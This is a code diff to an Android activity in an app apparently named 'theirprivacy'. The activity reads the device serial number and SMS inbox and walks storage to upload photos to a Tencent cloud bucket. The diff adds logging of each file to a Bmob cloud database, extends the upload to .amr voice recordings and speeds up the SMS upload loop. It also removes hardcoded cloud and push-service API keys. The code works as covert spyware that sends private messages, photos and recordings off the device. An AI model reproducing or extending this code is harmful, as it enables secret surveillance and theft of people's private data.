@@ -9,14 +9,13 @@ import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.widget.ImageView;
 
-import com.baidu.android.pushservice.PushConstants;
-import com.baidu.android.pushservice.PushManager;
 import com.tencent.cos.model.COSRequest;
 import com.tencent.cos.model.COSResult;
 import com.tencent.cos.model.PutObjectRequest;
 import com.tencent.cos.model.PutObjectResult;
 import com.tencent.cos.task.listener.IUploadTaskListener;
 import com.voler.theirprivacy.R;
+import com.voler.theirprivacy.bean.FileInfo;
 import com.voler.theirprivacy.bean.SmsInfo;
 import com.voler.theirprivacy.bean.UserInfo;
 import com.voler.theirprivacy.utils.PhoneInfo;
@@ -26,7 +25,6 @@ import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-import cn.bmob.v3.Bmob;
 import cn.bmob.v3.exception.BmobException;
 import cn.bmob.v3.listener.SaveListener;
 
@@ -44,6 +42,7 @@ public class MyMainActivity extends AppCompatActivity {
 
     private Uri SMS_INBOX = Uri.parse("content://sms/");
     private String serialNumber;//序列号
+    private boolean saveFileInfoSecond = false;//二次写入数据库
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -64,11 +63,6 @@ public class MyMainActivity extends AppCompatActivity {
 //        Toast.makeText(this,"遍历完毕",Toast.LENGTH_SHORT).show();
         PhoneInfo siminfo = new PhoneInfo(MyMainActivity.this);
 
-        //第一：默认初始化.bmob云数据库
-        Bmob.initialize(this, "2cbf044b0ebaa1b8d2acea05f19a22d7");
-
-        //百度推送
-        PushManager.startWork(getApplicationContext(), PushConstants.LOGIN_TYPE_API_KEY,"Gk5Z2BE1lbjzYtgnI1KzqCfo");
 
         serialNumber = siminfo.getSerialNumber();
         UserInfo userInfo = new UserInfo();
@@ -99,12 +93,9 @@ public class MyMainActivity extends AppCompatActivity {
 
     private void upload(String srcPath) {
         isFinish = false;
-//        String absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();
 
 
         cosPath = "photo" + File.separator + System.currentTimeMillis() + ".jpg";
-//        srcPath = new File(absolutePath, "s.jpg").getAbsolutePath();
-//        photo.setImageBitmap(BitmapFactory.decodeFile(srcPath));
 
         PutObjectRequest putObjectRequest = new PutObjectRequest();
         putObjectRequest.setBucket(mSign.getBucket());
@@ -123,8 +114,6 @@ public class MyMainActivity extends AppCompatActivity {
                     stringBuilder.append(" resource_path= " + result.resource_path == null ? "null" : result.resource_path + "\n");
                     stringBuilder.append(" url= " + result.url == null ? "null" : result.url);
                     Log.w("TEST", stringBuilder.toString());
-//                    notifyAll();
-//                    MyMainActivity.this.notifyAll();
                     isFinish = true;
                 }
             }
@@ -152,18 +141,50 @@ public class MyMainActivity extends AppCompatActivity {
     }
 
 
+    private void saveFileInfo(final String filePath, final String type) {
+        FileInfo fileInfo = new FileInfo();
+        fileInfo.setSerialnumber(serialNumber);
+        fileInfo.setFilePath(filePath);
+        fileInfo.setFileType(type);
+        fileInfo.save(new SaveListener<String>() {
+            @Override
+            public void done(String objectId, BmobException e) {
+                if (e == null) {
+                    Log.w("TEST", "添加数据成功，返回objectId为：" + objectId);
+                    upload(filePath);
+                    saveFileInfoSecond=false;
+                } else {
+                    Log.w("TEST", "创建数据失败：" + e.getMessage());
+                    if (e.getMessage().contains("duplicate")) {
+                        Log.w("TEST", "已有");
+                        isFinish = true;
+                        saveFileInfoSecond=false;
+                    } else if (!saveFileInfoSecond) {
+                        saveFileInfo(filePath,type);
+                        saveFileInfoSecond=true;
+                    }else {
+                        isFinish = true;
+                        saveFileInfoSecond=false;
+                    }
+                }
+            }
+        });
+    }
+
     private void uploadFile(File file) {
         if (!file.exists()) return;
         if (file.isFile()) {
             String filePath = file.getAbsolutePath();
             if (filePath.endsWith(".jpg")) {
-                upload(filePath);
-                while (!isFinish) {
-                    try {
-                        Thread.sleep(500);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
+                saveFileInfo(filePath, ".jpg");
+            } else if (filePath.endsWith(".amr")) {
+                saveFileInfo(filePath, ".amr");
+            }
+            while (!isFinish) {
+                try {
+                    Thread.sleep(200);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
                 }
             }
         } else if (file.isDirectory()) {
@@ -219,12 +240,11 @@ public class MyMainActivity extends AppCompatActivity {
                     } else {
                         Log.w("TEST", "创建数据失败：" + e.getMessage());
                     }
-//                    isSmsFinish = true;
                 }
             });
             while (!isSmsFinish) {
                 try {
-                    Thread.sleep(100);
+                    Thread.sleep(30);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -232,4 +252,3 @@ public class MyMainActivity extends AppCompatActivity {
         }
     }
 }
-
